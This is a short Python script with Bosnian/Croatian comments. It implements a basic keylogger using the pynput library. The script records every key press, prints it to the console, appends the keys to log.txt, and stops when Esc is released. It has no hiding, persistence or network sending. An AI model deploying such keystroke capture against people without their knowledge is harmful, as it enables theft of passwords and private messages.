import pynput
from pynput.keyboard import Key, Listener
# Listener - 'slusa' unos

# Program radi svo vrijeme
count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print('{0} pressed'.format(key))

    # Na koji redni key se upisuje i cita
    if count >= 2:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open('log.txt', 'a') as f:
        for key in keys:
            f.write(str(key))

def on_release(key):
    if key == Key.esc:
        return False

# Glavna funkcija , stalno 'slusa'
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
